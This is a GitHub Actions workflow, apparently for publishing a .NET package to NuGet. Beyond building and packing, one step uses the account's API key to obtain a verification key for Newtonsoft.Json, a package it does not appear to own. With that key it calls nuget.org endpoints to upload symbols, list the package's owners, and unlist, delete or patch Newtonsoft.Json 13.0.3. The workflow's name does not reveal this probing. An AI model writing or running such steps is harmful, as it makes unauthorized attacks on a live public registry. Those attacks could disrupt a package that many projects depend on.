name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build and Pack
        run: |
          dotnet build -c Release
          dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Explore verification key capabilities
        run: |
          # Get verification key for Newtonsoft.Json
          echo "=== Get verification key for Newtonsoft.Json ==="
          VERIFY_RESP=$(curl -s -X POST "https://www.nuget.org/api/v2/package/create-verification-key/Newtonsoft.Json/13.0.3" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "Content-Type: application/json" \
            -H "Content-Length: 0" \
            -d "")
          echo "Response: $VERIFY_RESP"
          VERIFY_KEY=$(echo "$VERIFY_RESP" | jq -r '.Key')
          
          echo -e "\n=== Test verifykey endpoint with the key ==="
          # This is what the key is supposed to be used for
          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/verifykey/Newtonsoft.Json/13.0.3" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY"
          
          echo -e "\n\n=== What does verifykey return for our OWN package? ==="
          OWN_VERIFY=$(curl -s -X POST "https://www.nuget.org/api/v2/package/create-verification-key/DynamoTest456/1.0.0" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "Content-Type: application/json" \
            -H "Content-Length: 0" \
            -d "")
          echo "Own key response: $OWN_VERIFY"
          OWN_KEY=$(echo "$OWN_VERIFY" | jq -r '.Key')
          
          curl -s -w "\nHTTP:%{http_code}" -X GET "https://www.nuget.org/api/v2/verifykey/DynamoTest456/1.0.0" \
            -H "X-NuGet-ApiKey: $OWN_KEY"
          
          echo -e "\n\n=== Try symbol package endpoints ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/symbolpackage/" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
            -H "Content-Type: application/octet-stream" \
            -H "Content-Length: 0"
          
          echo -e "\n\n=== Try relist/unlist with verify key ==="
          curl -s -w "\nHTTP:%{http_code}" -X POST "https://www.nuget.org/api/v2/package/Newtonsoft.Json/13.0.3" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
            -H "Content-Length: 0"
          
          curl -s -w "\nHTTP:%{http_code}" -X DELETE "https://www.nuget.org/api/v2/package/Newtonsoft.Json/13.0.3" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY"
          
          echo -e "\n\n=== Try v3 API endpoints ==="
          curl -s -w "\nHTTP:%{http_code}" -X GET "https://api.nuget.org/v3/registration5-gz-semver2/newtonsoft.json/index.json" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY"
          
          echo -e "\n\n=== Can we enumerate who owns Newtonsoft.Json? ==="
          curl -s -w "\nHTTP:%{http_code}" "https://www.nuget.org/packages/Newtonsoft.Json/Owners" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY"
          
          echo -e "\n\n=== Try package metadata update? ==="
          curl -s -w "\nHTTP:%{http_code}" -X PATCH "https://www.nuget.org/api/v2/package/Newtonsoft.Json/13.0.3" \
            -H "X-NuGet-ApiKey: $VERIFY_KEY" \
            -H "Content-Type: application/json" \
            -d '{"listed": false}'

        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
